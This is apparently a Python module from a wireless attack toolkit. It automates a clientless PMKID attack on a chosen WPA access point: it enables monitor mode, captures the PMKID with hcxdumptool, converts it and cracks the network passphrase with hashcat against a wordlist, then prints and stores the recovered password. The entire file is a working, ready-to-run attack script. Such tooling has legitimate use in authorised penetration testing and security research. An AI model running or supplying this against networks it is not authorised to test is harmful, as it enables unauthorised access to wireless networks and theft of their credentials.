"""PMKID clientless capture (hcxdumptool) + crack (hashcat -m 22000)."""

import asyncio
import os
import re
from pathlib import Path

from core.exec_utils import run_command, validate_mac, validate_channel
from core.hardware import start_monitor_mode, stop_monitor_mode, track_process, detect_hashcat_gpu
from core.models import save_result
from core.validation import sanitize_ssid
from core.display import console, info, ok, warn, err, header, StatusLine

CAPTURE_DIR = Path("captures")
HASHCAT_RULES = "/usr/share/hashcat/rules/best64.rule"


async def run_pmkid(
    interface: str, bssid: str, channel: str, ssid: str, wordlist: str,
    capture_timeout: int = 60, use_rules: bool = False,
) -> None:
    header("PMKID Clientless Cracking")
    if not validate_mac(bssid):
        err("Invalid BSSID"); return
    if not validate_channel(channel):
        err("Invalid channel"); return
    if not os.path.isfile(wordlist):
        err(f"Wordlist not found: {wordlist!r}"); return
    try:
        ssid = sanitize_ssid(ssid)
    except ValueError as e:
        err(str(e)); return

    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    mon_iface = await start_monitor_mode(interface)
    ok(f"Monitor mode active on {mon_iface}")

    capture_file = CAPTURE_DIR / f"pmkid_{bssid.replace(':','')}.pcapng"
    hash_file = CAPTURE_DIR / f"pmkid_{bssid.replace(':','')}.22000"
    cracked_file = CAPTURE_DIR / f"pmkid_{bssid.replace(':','')}.cracked"

    dump_cmd = ["sudo", "hcxdumptool", "-i", mon_iface, f"--bssid_stop={bssid}",
                "-c", channel, "-o", str(capture_file)]
    dump_proc = await asyncio.create_subprocess_exec(*dump_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    track_process(dump_proc)

    info(f"Capturing PMKID for up to {capture_timeout}s...")
    try:
        with StatusLine("Listening for PMKID...") as status:
            for i in range(capture_timeout):
                status.update(f"{i}s / {capture_timeout}s")
                if dump_proc.returncode is not None:
                    break
                await asyncio.sleep(1)
    except (KeyboardInterrupt, asyncio.CancelledError):
        warn("Stopped by user.")
    finally:
        if dump_proc.returncode is None:
            dump_proc.terminate()
            try:
                await dump_proc.wait()
            except Exception:
                pass

    if not capture_file.exists() or capture_file.stat().st_size == 0:
        await stop_monitor_mode(mon_iface)
        err("No PMKID captured. Try a longer --timeout or move closer to the AP.")
        return

    info("Converting capture to hashcat 22000 format...")
    try:
        await run_command(["hcxpcapngtool", "-o", str(hash_file), str(capture_file)])
    except Exception as e:
        await stop_monitor_mode(mon_iface)
        err(f"Conversion failed: {e}")
        return

    if not hash_file.exists() or hash_file.stat().st_size == 0:
        await stop_monitor_mode(mon_iface)
        err("Capture contained no PMKID hash (AP may not support PMKID-based association).")
        return

    ok("PMKID hash extracted. Starting hashcat...")
    await stop_monitor_mode(mon_iface)

    crack_cmd = ["hashcat", "-m", "22000", "-a", "0", "--status", "--status-timer=5",
                 "--quiet", "--outfile", str(cracked_file), "--outfile-format", "1",
                 str(hash_file), wordlist]
    if use_rules and os.path.exists(HASHCAT_RULES):
        crack_cmd += ["-r", HASHCAT_RULES]
        info("Using best64 rules")

    gpu_available, gpu_summary = await detect_hashcat_gpu()
    if gpu_available:
        ok(gpu_summary)
    else:
        warn(f"{gpu_summary}. Cracking will be slower without GPU acceleration.")

    crack_proc = await asyncio.create_subprocess_exec(*crack_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    track_process(crack_proc)
    try:
        with StatusLine("Cracking...") as status:
            while True:
                line = await crack_proc.stdout.readline()
                if not line:
                    break
                decoded = line.decode(errors="replace")
                m = re.search(r"Progress\.+: (\d+)/(\d+)", decoded)
                if m:
                    status.update(f"{m.group(1)}/{m.group(2)} candidates tried")
        await crack_proc.wait()
    except (KeyboardInterrupt, asyncio.CancelledError):
        crack_proc.terminate()

    if cracked_file.exists() and cracked_file.stat().st_size > 0:
        first = cracked_file.read_text().splitlines()[0].strip()
        password = first.split(":")[-1] if ":" in first else first
        ok(f"PASSWORD FOUND: [bold green]{password}[/bold green]")
        save_result(bssid.replace(":", ""), "pmkid", bssid, ssid, password)
    else:
        warn("Password not found in wordlist.")
